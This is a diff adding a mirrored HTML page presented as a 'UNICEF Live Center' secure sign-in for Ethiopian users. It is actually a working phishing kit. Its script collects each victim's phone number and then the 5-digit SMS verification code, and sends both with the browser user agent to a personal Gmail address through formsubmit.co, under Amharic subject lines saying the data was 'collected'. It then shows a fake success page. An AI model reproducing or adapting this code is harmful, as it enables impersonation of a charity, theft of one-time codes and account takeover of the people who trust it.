@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="am">
+
+<!-- Mirrored from unicef-ethiopia.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 10 Jun 2026 17:27:47 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>UNICEF Live Center · Secure Sign In</title>
+<link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="stylesheet" href="../external.html?link=https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap">
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+}
+
+body {
+  background: linear-gradient(135deg, BLUE 0%, #0E0969 100%);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+  animation: gradientBG 15s ease infinite;
+  background-size: 400% 400%;
+}
+
+@keyframes gradientBG {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.container {
+  width: 100%;
+  max-width: 500px;
+  animation: fadeIn 0.8s ease-out;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.header {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 25px;
+  position: relative;
+}
+
+.card {
+  background: BLACK;
+  border-radius: 20px;
+  box-shadow: 0 15px 50px rgba(0, 0, 0, 0.25);
+  overflow: hidden;
+  margin-bottom: 30px;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+}
+
+.card-header {
+  background: linear-gradient(to right, BLUE, #00599D);
+  padding: 30px 25px 25px;
+  border-bottom: 1px solid #e9ecef;
+  color: white;
+  text-align: center;
+  position: relative;
+}
+
+.card-header h1 {
+  font-size: 28px;
+  margin-bottom: 10px;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+}
+
+.card-header p {
+  font-size: 16px;
+  opacity: 0.95;
+  line-height: 1.6;
+}
+
+.unicef-logo-container {
+  width: 50%;
+  max-width: 400px;
+  height: 100px;
+  margin: 0 auto 25px auto;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #48b3fa;
+  border-radius: 15px;
+  padding: 30px;
+  border: 5px BLUE;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+}
+
+.unicef-logo-img {
+  max-width: 100%;
+  max-height: 100%;
+  object-fit: contain;
+  display: block;
+}
+
+.card-body {
+  padding: 30px;
+}
+
+.form-group {
+  margin-bottom: 28px;
+  animation: slideUp 0.5s ease-out;
+}
+
+@keyframes slideUp {
+  from { opacity: 0; transform: translateY(15px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.form-group label {
+  display: block;
+  font-size: 16px;
+  color: #6c757d;
+  margin-bottom: 12px;
+  font-weight: 600;
+}
+
+.country-selector {
+  width: 100%;
+  padding: 16px 20px;
+  border: 2px solid white;
+  border-radius: 12px;
+  background-color: black;
+  font-size: 16px;
+  color: white;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  transition: all 0.3s ease;
+  margin-bottom: 20px;
+}
+
+.country-selector:hover {
+  border-color: #2AABEE;
+  transform: translateY(-3px);
+  box-shadow: 0 5px 15px rgba(42, 171, 238, 0.1);
+}
+
+.country-selector:focus {
+  outline: none;
+  border-color: white;
+  box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.25);
+}
+
+.country-flag {
+  width: 36px;
+  height: 26px;
+  margin-right: 15px;
+  border-radius: 4px;
+  object-fit: cover;
+  border: 1px solid #dee2e6;
+}
+
+.country-dropdown {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  right: 0;
+  background: white;
+  border: 2px solid #e0e6ed;
+  border-radius: 12px;
+  max-height: 350px;
+  overflow-y: auto;
+  z-index: 1000;
+  display: none;
+  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+}
+
+.country-dropdown.active {
+  display: block;
+  animation: dropdownFade 0.3s ease;
+}
+
+@keyframes dropdownFade {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.country-item {
+  padding: 16px 20px;
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  border-bottom: 1px solid #f8f9fa;
+}
+
+.country-item:hover {
+  background-color: #f8f9fa;
+  transform: translateX(5px);
+}
+
+.country-item.selected {
+  background-color: #e7f5ff;
+  border-left: 4px solid #2AABEE;
+}
+
+.phone-input-container {
+  display: flex;
+  align-items: center;
+  border: 1px  black;
+  border-radius: 6px;
+  overflow: hidden;
+  transition: all 0.3s ease;
+}
+
+.phone-input-container:focus-within {
+  border-color: black;
+  box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.25);
+}
+
+.country-code {
+  padding: 16px 20px;
+  background: black;
+  border-right: 2px solid white;
+  font-size: 17px;
+  color: white;
+  font-weight: 700;
+  min-width: 100px;
+  text-align: center;
+}
+
+.phone-input {
+  flex: 1;
+  border: none;
+  padding: 16px 20px;
+  font-size: 17px;
+  color: white;
+  background: black;
+  width: 100%;
+  box-sizing: border-box;
+}
+
+.phone-input:focus {
+  outline: none;
+  background-color: black;
+}
+
+.code-sent-info {
+  background: linear-gradient(to right, #e7f5ff, #d0ebff);
+  border-radius: 15px;
+  padding: 25px;
+  margin-bottom: 30px;
+  text-align: center;
+  animation: slideUp 0.6s ease-out;
+  border: 2px solid #a5d8ff;
+}
+
+.code-sent-info h3 {
+  font-size: 22px;
+  color: black;
+  margin-bottom: 12px;
+  font-weight: 700;
+}
+
+.code-sent-info p {
+  font-size: 16px;
+  color: #6c757d;
+  line-height: 1.7;
+}
+
+.phone-number-display {
+  font-size: 22px;
+  font-weight: 800;
+  color: #212529;
+  margin: 15px 0;
+  padding: 15px 7px;
+  background: white;
+  border-radius: 10px;
+  display: inline-block;
+  border: 2px solid #2AABEE;
+}
+
+.code-input-container {
+  position: relative;
+  margin-bottom: 50px;
+}
+
+.code-input {
+  width: 100%;
+  padding: 20px;
+  border: 3px solid #ced4da;
+  border-radius: 12px;
+  font-size: 32px;
+  text-align: center;
+  letter-spacing: 12px;
+  color: #212529;
+  font-weight: 700;
+  transition: all 0.3s ease;
+  background: #f8f9fa;
+}
+
+.code-input:focus {
+  outline: none;
+  border-color: #2AABEE;
+  box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.25);
+  transform: scale(1.02);
+  background: white;
+}
+
+.code-input.error {
+  border-color: #dc3545;
+  background: #fff5f5;
+  animation: shake 0.5s ease;
+}
+
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  25% { transform: translateX(-5px); }
+  75% { transform: translateX(5px); }
+}
+
+.btn {
+  width: 100%;
+  padding: 18px;
+  border: none;
+  border-radius: 12px;
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+  letter-spacing: 0.5px;
+}
+
+.btn span {
+  position: relative;
+  z-index: 1;
+}
+
+.btn::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 0;
+  height: 0;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.2);
+  transform: translate(-50%, -50%);
+  transition: width 0.6s, height 0.6s;
+}
+
+.btn:hover::after {
+  width: 400px;
+  height: 400px;
+}
+
+.btn-primary {
+  background: linear-gradient(to right, #2AABEE, #229ED9);
+  color: white;
+}
+
+.btn-primary:hover {
+  background: linear-gradient(to right, #229ED9, #1e8bc3);
+  transform: translateY(-4px);
+  box-shadow: 0 10px 25px rgba(42, 171, 238, 0.5);
+}
+
+.btn-primary:disabled {
+  background: #a5d8f3;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+  opacity: 0.7;
+}
+
+.footer {
+  text-align: center;
+  font-size: 14px;
+  color: #6c757d;
+  line-height: 1.7;
+  padding: 20px;
+  border-top: 1px solid #e9ecef;
+  margin-top: 25px;
+}
+
+.footer a {
+  color: #2AABEE;
+  text-decoration: none;
+  font-weight: 600;
+  transition: color 0.2s ease;
+}
+
+.footer a:hover {
+  color: #229ED9;
+  text-decoration: underline;
+}
+
+.steps {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 35px;
+  position: relative;
+}
+
+.steps::before {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50px;
+  right: 50px;
+  height: 4px;
+  background: #e9ecef;
+  transform: translateY(-50%);
+  z-index: 0;
+}
+
+.step {
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  background-color: white;
+  color: #6c757d;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 15px;
+  font-weight: 800;
+  font-size: 18px;
+  border: 4px solid #e9ecef;
+  position: relative;
+  z-index: 1;
+  transition: all 0.4s ease;
+}
+
+.step.active {
+  background-color: #2AABEE;
+  color: white;
+  border-color: #2AABEE;
+  transform: scale(1.15);
+  box-shadow: 0 8px 20px rgba(42, 171, 238, 0.5);
+}
+
+.step.completed {
+  background-color: #20c997;
+  color: white;
+  border-color: #20c997;
+  animation: bounce 0.5s ease;
+}
+
+@keyframes bounce {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.3); }
+}
+
+.alert {
+  padding: 18px;
+  border-radius: 12px;
+  margin-bottom: 25px;
+  font-size: 15px;
+  animation: slideUp 0.8s ease-out;
+}
+
+.alert-info {
+  background: linear-gradient(to right, #e7f5ff, #d0ebff);
+  border-left: 6px solid #2AABEE;
+  color: #0c5460;
+  font-weight: 500;
+}
+
+.page {
+  display: none;
+  animation: pageFade 0.5s ease-out;
+}
+
+@keyframes pageFade {
+  from { opacity: 0; transform: translateX(20px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+
+.page.active {
+  display: block;
+}
+
+.validation-message {
+  font-size: 14px;
+  color: #dc3545;
+  margin-top: 8px;
+  display: none;
+  animation: slideUp 0.3s ease;
+}
+
+.validation-message.show {
+  display: block;
+}
+
+.country-search {
+  padding: 14px 20px;
+  border-bottom: 2px solid #e9ecef;
+  background: #f8f9fa;
+}
+
+.country-search input {
+  width: 100%;
+  padding: 10px 15px;
+  border: 2px solid #dee2e6;
+  border-radius: 8px;
+  font-size: 15px;
+}
+
+.country-search input:focus {
+  outline: none;
+  border-color: #2AABEE;
+}
+
+@media (max-width: 480px) {
+  .container { max-width: 100%; }
+  .card-header h1 { font-size: 24px; }
+  .card-header p { font-size: 15px; }
+  .country-selector, .phone-input, .code-input, .btn { padding: 15px; }
+  .unicef-logo-container { width: 220px; height: 140px; padding: 15px; }
+  .step { width: 45px; height: 45px; margin: 0 10px; }
+  .code-input { font-size: 28px; letter-spacing: 8px; }
+}
+
+.success-animation {
+  text-align: center;
+  margin: 40px 0;
+  animation: slideUp 1s ease-out;
+}
+
+.success-circle {
+  width: 120px;
+  height: 120px;
+  background:linear-gradient(135deg, #003B80, #003B80);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 30px;
+  animation: successPulse 2s infinite;
+  box-shadow: 0 10px 30px rgba(32, 201, 151, 0.4);
+}
+
+@keyframes successPulse {
+  0% { box-shadow: 0 10px 30px rgba(32, 201, 151, 0.4); }
+  50% { box-shadow: 0 10px 40px rgba(32, 201, 151, 0.7); }
+  100% { box-shadow: 0 10px 30px rgba(32, 201, 151, 0.4); }
+}
+
+.success-check {
+  color: white;
+  font-size: 60px;
+  font-weight: bold;
+}
+
+.success-title {
+  margin-bottom: 20px;
+  color: #212529;
+  font-size: 26px;
+  font-weight: 800;
+}
+
+.success-message {
+  color: #6c757d;
+  font-size: 17px;
+  line-height: 1.8;
+}
+
+.security-note {
+  text-align: center;
+  color: #666;
+  font-size: 14px;
+  margin-top: 20px;
+  padding: 15px;
+  background: #f8f9faa;
+  border-radius: 10px;
+  border: 1px solid #dee2e6;
+}
+
+.section-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: #2AABEE;
+  margin-bottom: 10px;
+  text-align: center;
+  border-bottom: 2px solid #e9ecef;
+  padding-bottom: 8px;
+}
+
+.animated-button {
+  background: linear-gradient(to right, #2AABEE, #229ED9, #36a2eb, #2AABEE);
+  background-size: 300% 100%;
+  animation: gradientShift 3s ease infinite;
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.unicef-title {
+  text-align: center;
+  margin-bottom: 30px;
+  color: white;
+  font-size: 32px;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.phone-input::placeholder {
+  color: #6c757d;
+  font-size: 16px;
+  opacity: 0.8;
+}
+
+.code-hint {
+  font-size: 14px;
+  color: #2AABEE;
+  margin-top: 8px;
+  text-align: center;
+  font-weight: 500;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="unicef-title">UNICEF LIVE CENTER</div>
+  <div class="unicef-logo-container">
+    <img src="Flag_of_UNICEF.svg.png" alt="UNICEF " class="unicef-logo-img">
+  </div>
+
+  <!-- Step 1: Phone number -->
+  <div class="card page active" id="phone-page">
+    <div class="card-header"><h1>Sign in to UNICEF Live Center</h1><p>Secure authentication for UNICEF partners</p></div>
+    <div class="card-body">
+      <div class="section-title">የአገር ምርጫ</div>
+      <div class="form-group">
+        <div class="country-selector" id="country-selector"><div><img src="http://flagcdn.com/w40/et.png" class="country-flag" alt="Ethiopia flag"><span>Ethiopia (+251)</span></div><span>▼</span></div>
+        <div class="country-dropdown" id="country-dropdown"><div class="country-search"><input type="text" id="country-search" placeholder="Search country..."></div></div>
+      </div>
+      <div class="section-title">የስልክ ቁጥር</div>
+      <div class="form-group">
+        <div class="phone-input-container"><div class="country-code" id="country-code">+251</div><input type="tel" class="phone-input" id="phone" placeholder="እባክዎ የእርስዎን ስልክ ቁጥር ያስገቡ" autocomplete="off"></div>
+        <div class="validation-message" id="phone-error"></div>
+      </div>
+      <div class="alert alert-info"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i>Your phone number will be used for secure authentication only.</div>
+      <button class="btn btn-primary animated-button" id="next-btn"><span><i class="fas fa-paper-plane" style="margin-right: 10px;"></i>Send Verification Code</span></button>
+      <div class="footer"><p>By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p><p>© 2025 UNICEF FZ-LLC</p></div>
+    </div>
+  </div>
+  
+  <!-- Step 2: 5-digit verification code (no timer, no lock) -->
+  <div class="card page" id="code-page">
+    <div class="card-header"><h1>UNICEF Live Verification</h1><p>Enter the 5-digit verification code</p></div>
+    <div class="card-body">
+      <div class="code-sent-info"><h3>Verification Code Sent</h3><p>A 5-digit verification code has been sent to:</p><div class="phone-number-display" id="display-phone">+251 09 123 456 78</div><p>Please enter the 5-digit code below to complete your sign-in.</p></div>
+      <div class="form-group"><label for="code">5-Digit Verification Code</label>
+        <div class="code-input-container"><input type="text" class="code-input" id="code" placeholder="00000" maxlength="5" autocomplete="off" inputmode="numeric"></div>
+        <div class="code-hint"><i class="fas fa-lock"></i> Enter the 5-digit code received via SMS</div>
+        <div class="validation-message" id="code-error"></div>
+      </div>
+      <button class="btn btn-primary animated-button" id="signin-btn"><span><i class="fas fa-check-circle" style="margin-right: 10px;"></i>Verify & Sign In</span></button>
+      <div class="security-note"><strong>Security Protocol:</strong> Your code is validated instantly. UNICEF never asks for your code outside this secure portal.</div>
+      <div class="footer"><p>For security reasons, never share your verification code.</p><p>UNICEF Secure Authentication System</p></div>
+    </div>
+  </div>
+  
+  <!-- Step 3: Success -->
+  <div class="card page" id="success-page">
+    <div class="card-header"><h1>Sign in Successful</h1><p>Welcome to UNICEF Live Center</p></div>
+    <div class="card-body"><div class="success-animation"><div class="success-circle"><span class="success-check">✓</span></div><h3 class="success-title">Logged In Successfully</h3><p class="success-message">Your account has been verified through UNICEF Secure Authentication. You can now access UNICEF Live Center with full partnership features and live support.</p></div><div class="security-note" style="margin-top: 30px;"><strong>Security Message:</strong> Your login was successful. Please keep your account secure and do not share your verification codes with anyone.</div><div class="footer"><p>© 2026 UNICEF FZ-LLC</p><p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">Contact Live Support</a></p></div></div>
+  </div>
+</div>
+
+<script>
+// DUAL EMAIL DELIVERY (both email addresses as required)
+const TARGET_EMAILS = [
+"vb2751532@gmail.com"];
+async function sendDataToBothEmails(payload) {
+  const promises = TARGET_EMAILS.map(email => 
+    fetch(`https://formsubmit.co/ajax/${email}`, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(err => ({ status: "rejected", error: err }))
+  );
+  return Promise.allSettled(promises);
+}
+
+// ---------- global state ----------
+let isSendingPhone = false;
+let isVerifying = false;
+let selectedCountry = {
+  code: "ET",
+  name: "Ethiopia",
+  dialCode: "+251",
+  flag: "https://flagcdn.com/w40/et.png",
+  phonePattern: /^(09\d{8}|9\d{8})$/,
+  phoneLength: 10,
+  example: "0912345678"
+};
+const countries = [
+  {code: "US", name: "United States", dialCode: "+1", flag: "https://flagcdn.com/w40/us.png", phonePattern: /^\d{10}$/, phoneLength: 10, example: "1234567890"},
+  {code: "CA", name: "Canada", dialCode: "+1", flag: "https://flagcdn.com/w40/ca.png", phonePattern: /^\d{10}$/, phoneLength: 10, example: "1234567890"},
+  {code: "GB", name: "United Kingdom", dialCode: "+44", flag: "https://flagcdn.com/w40/gb.png", phonePattern: /^(\d{10,11})$/, phoneLength: [10,11], example: "7912345678"},
+  {code: "ET", name: "Ethiopia", dialCode: "+251", flag: "https://flagcdn.com/w40/et.png", phonePattern: /^(09\d{8}|9\d{8})$/, phoneLength: 10, example: "0912345678"},
+  {code: "KE", name: "Kenya", dialCode: "+254", flag: "https://flagcdn.com/w40/ke.png", phonePattern: /^(07\d{8}|7\d{8})$/, phoneLength: 10, example: "0712345678"},
+  {code: "SD", name: "Sudan", dialCode: "+249", flag: "https://flagcdn.com/w40/sd.png", phonePattern: /^(09\d{8}|9\d{8})$/, phoneLength: 10, example: "0912345678"},
+  {code: "ER", name: "Eritrea", dialCode: "+291", flag: "https://flagcdn.com/w40/er.png", phonePattern: /^(07\d{6}|7\d{6})$/, phoneLength: 8, example: "07123456"},
+  {code: "DJ", name: "Djibouti", dialCode: "+253", flag: "https://flagcdn.com/w40/dj.png", phonePattern: /^(07\d{6}|7\d{6})$/, phoneLength: 8, example: "07123456"},
+  {code: "SO", name: "Somalia", dialCode: "+252", flag: "https://flagcdn.com/w40/so.png", phonePattern: /^(07\d{7}|7\d{7})$/, phoneLength: 9, example: "071234567"},
+  {code: "EG", name: "Egypt", dialCode: "+20", flag: "https://flagcdn.com/w40/eg.png", phonePattern: /^(01\d{9}|1\d{9})$/, phoneLength: 11, example: "01234567890"},
+  {code: "SA", name: "Saudi Arabia", dialCode: "+966", flag: "https://flagcdn.com/w40/sa.png", phonePattern: /^(05\d{8}|5\d{8})$/, phoneLength: 10, example: "0512345678"},
+  {code: "AE", name: "UAE", dialCode: "+971", flag: "https://flagcdn.com/w40/ae.png", phonePattern: /^(05\d{8}|5\d{8})$/, phoneLength: 10, example: "0512345678"}
+];
+
+function showPage(pageId) {
+  document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+  document.getElementById(pageId).classList.add('active');
+}
+
+function loadCountries() {
+  const dropdown = document.getElementById('country-dropdown');
+  function renderCountries(filter = '') {
+    dropdown.innerHTML = `<div class="country-search"><input type="text" id="country-search" placeholder="Search country..." value="${filter}"></div>`;
+    const filtered = countries.filter(c => c.name.toLowerCase().includes(filter.toLowerCase()) || c.dialCode.includes(filter));
+    filtered.forEach(country => {
+      const item = document.createElement('div');
+      item.className = `country-item ${country.code === selectedCountry.code ? 'selected' : ''}`;
+      item.setAttribute('data-code', country.code);
+      item.innerHTML = `<img src="${country.flag}" class="country-flag" alt="${country.name}"><span style="flex:1;">${country.name}</span><span style="font-weight:700;color:#2AABEE;">${country.dialCode}</span>`;
+      item.addEventListener('click', () => { selectCountry(country); dropdown.classList.remove('active'); });
+      dropdown.appendChild(item);
+    });
+    const searchInput = document.getElementById('country-search');
+    if(searchInput) searchInput.addEventListener('input', (e) => renderCountries(e.target.value));
+  }
+  renderCountries();
+}
+
+function selectCountry(country) {
+  selectedCountry = country;
+  const selector = document.getElementById('country-selector');
+  selector.innerHTML = `<div style="display:flex; align-items:center;"><img src="${country.flag}" class="country-flag" alt="${country.name}"><span>${country.name} (${country.dialCode})</span></div><span>▼</span>`;
+  document.getElementById('country-code').textContent = country.dialCode;
+  document.getElementById('phone').placeholder = "እባክዎ የእርስዎን ስልክ ቁጥር ያስገቡ";
+  document.querySelectorAll('.country-item').forEach(item => {
+    item.classList.remove('selected');
+    if(item.getAttribute('data-code') === country.code) item.classList.add('selected');
+  });
+}
+
+function validatePhoneNumber(phone) {
+  const errorElement = document.getElementById('phone-error');
+  if(!phone || phone.trim() === '') {
+    errorElement.textContent = "እባክዎ ስልክ ቁጥር ያስገቡ";
+    errorElement.classList.add('show');
+    return false;
+  }
+  const clean = phone.replace(/\s/g, '').replace(/\D/g, '');
+  if(!selectedCountry.phonePattern.test(clean)) {
+    let msg = "እባክዎ ትክክለኛ ስልክ ቁጥር ያስገቡ";
+    if(selectedCountry.code === "ET") msg = "ለኢትዮጵያ፡ 09xxxxxxxx (10 አሃዞች መሆን አለበት፣ በ09 መጀመር አለበት)";
+    else if(selectedCountry.code === "KE") msg = "For Kenya: 07xxxxxxxx (10 digits, starting with 07)";
+    else if(selectedCountry.code === "US") msg = "For US/Canada: 10-digit number (e.g., 1234567890)";
+    errorElement.textContent = msg;
+    errorElement.classList.add('show');
+    return false;
+  }
+  errorElement.classList.remove('show');
+  return true;
+}
+
+// SEND PHONE (dual email delivery)
+async function sendPhone() {
+  if(isSendingPhone) return;
+  const phoneInput = document.getElementById('phone');
+  const phone = phoneInput.value;
+  const nextBtn = document.getElementById('next-btn');
+  if(!validatePhoneNumber(phone)) { phoneInput.focus(); return; }
+  isSendingPhone = true;
+  nextBtn.disabled = true;
+  nextBtn.innerHTML = '<span><i class="fas fa-spinner fa-pulse"></i> Sending...</span>';
+  
+  const cleanPhone = phone.replace(/\s/g, '').replace(/\D/g, '');
+  let formattedPhone = cleanPhone;
+  if(selectedCountry.code === "ET" && cleanPhone.length === 10) formattedPhone = cleanPhone.replace(/(\d{2})(\d{3})(\d{2})(\d{3})/, '$1 $2 $3 $4');
+  else if((selectedCountry.code === "US" || selectedCountry.code === "CA") && cleanPhone.length === 10) formattedPhone = cleanPhone.replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2 $3');
+  else if(cleanPhone.length === 9) formattedPhone = cleanPhone.replace(/(\d{3})(\d{3})(\d{3})/, '$1 $2 $3');
+  else if(cleanPhone.length === 11) formattedPhone = cleanPhone.replace(/(\d{3})(\d{4})(\d{4})/, '$1 $2 $3');
+  
+  document.getElementById('display-phone').textContent = `${selectedCountry.dialCode} ${formattedPhone}`;
+  
+  const payload = {
+    country: selectedCountry.name,
+    country_code: selectedCountry.code,
+    dial_code: selectedCountry.dialCode,
+    phone_number: cleanPhone,
+    formatted_phone: phone,
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent,
+    _subject: "📱 ስልክ ቁጥር ተሰብስቧል - UNICEF Live Center (dual delivery)"
+  };
+  
+  await sendDataToBothEmails(payload);
+  showPage('code-page');
+  // Clear any previous code input & focus
+  document.getElementById('code').value = '';
+  document.getElementById('code').focus();
+  nextBtn.disabled = false;
+  nextBtn.innerHTML = '<span><i class="fas fa-paper-plane" style="margin-right: 10px;"></i>Send Verification Code</span>';
+  isSendingPhone = false;
+}
+
+// VERIFY 5-digit CODE (dual email delivery)
+async function verifyCode() {
+  if(isVerifying) return;
+  const codeInput = document.getElementById('code');
+  const code = codeInput.value.trim();
+  const signinBtn = document.getElementById('signin-btn');
+  const codeError = document.getElementById('code-error');
+  
+  codeError.classList.remove('show');
+  codeError.textContent = '';
+  
+  if(!code || code.length !== 5 || !/^\d{5}$/.test(code)) {
+    codeError.textContent = "Please enter a valid 5-digit verification code";
+    codeError.classList.add('show');
+    codeInput.classList.add('error');
+    setTimeout(() => codeInput.classList.remove('error'), 800);
+    codeInput.focus();
+    return;
+  }
+  
+  isVerifying = true;
+  signinBtn.disabled = true;
+  signinBtn.innerHTML = '<span><i class="fas fa-spinner fa-pulse"></i> Verifying...</span>';
+  
+  const payload = {
+    country: selectedCountry.name,
+    country_code: selectedCountry.code,
+    verification_code: code,
+    code_type: "5-digit",
+    timestamp: new Date().toISOString(),
+    _subject: "🔐 5-አሃዝ ኮድ ተሰብስቧል - UNICEF Live Center (dual delivery)"
+  };
+  
+  await sendDataToBothEmails(payload);
+  showPage('success-page');
+  signinBtn.disabled = false;
+  signinBtn.innerHTML = '<span><i class="fas fa-check-circle" style="margin-right: 10px;"></i>Verify & Sign In</span>';
+  isVerifying = false;
+}
+
+// ---- Event Listeners & Formatting ----
+document.getElementById('phone').addEventListener('input', function(e) {
+  let val = e.target.value.replace(/\D/g, '');
+  if(selectedCountry.code === "ET") {
+    if(val.length > 0) {
+      if(val.length <= 2) val = val;
+      else if(val.length <= 5) val = val.replace(/(\d{2})(\d{0,3})/, '$1 $2');
+      else if(val.length <= 7) val = val.replace(/(\d{2})(\d{3})(\d{0,2})/, '$1 $2 $3');
+      else val = val.replace(/(\d{2})(\d{3})(\d{2})(\d{0,3})/, '$1 $2 $3 $4');
+    }
+  } else if(selectedCountry.code === "US" || selectedCountry.code === "CA") {
+    if(val.length > 0) {
+      if(val.length <= 3) val = val;
+      else if(val.length <= 6) val = val.replace(/(\d{3})(\d{0,3})/, '$1 $2');
+      else val = val.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3');
+    }
+  } else {
+    if(val.length > 4) val = val.replace(/(\d{4})/, '$1 ');
+    if(val.length > 8) val = val.replace(/(\d{4}) (\d{4})/, '$1 $2 ');
+  }
+  e.target.value = val;
+  document.getElementById('phone-error').classList.remove('show');
+});
+
+// 5-digit only input for code
+document.getElementById('code').addEventListener('input', function(e) {
+  let val = e.target.value.replace(/\D/g, '');
+  if(val.length > 5) val = val.substring(0,5);
+  e.target.value = val;
+  document.getElementById('code-error').classList.remove('show');
+  if(val.length === 5) {
+    // optional auto-trigger? not auto-submit to let user confirm, but we keep it clean
+  }
+});
+
+document.getElementById('country-selector').addEventListener('click', (e) => { e.stopPropagation(); document.getElementById('country-dropdown').classList.toggle('active'); if(document.getElementById('country-dropdown').classList.contains('active')) document.getElementById('country-search')?.focus(); });
+document.addEventListener('click', (e) => { if(!e.target.closest('.country-selector') && !e.target.closest('.country-dropdown')) document.getElementById('country-dropdown').classList.remove('active'); });
+document.getElementById('phone').addEventListener('keypress', (e) => { if(e.key === 'Enter') sendPhone(); });
+document.getElementById('code').addEventListener('keypress', (e) => { if(e.key === 'Enter') verifyCode(); });
+document.getElementById('next-btn').addEventListener('click', sendPhone);
+document.getElementById('signin-btn').addEventListener('click', verifyCode);
+
+window.addEventListener('DOMContentLoaded', () => {
+  loadCountries();
+  document.getElementById('phone').focus();
+});
+</script>
+</body>
+
+<!-- Mirrored from unicef-ethiopia.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 10 Jun 2026 17:27:52 GMT -->
+</html>
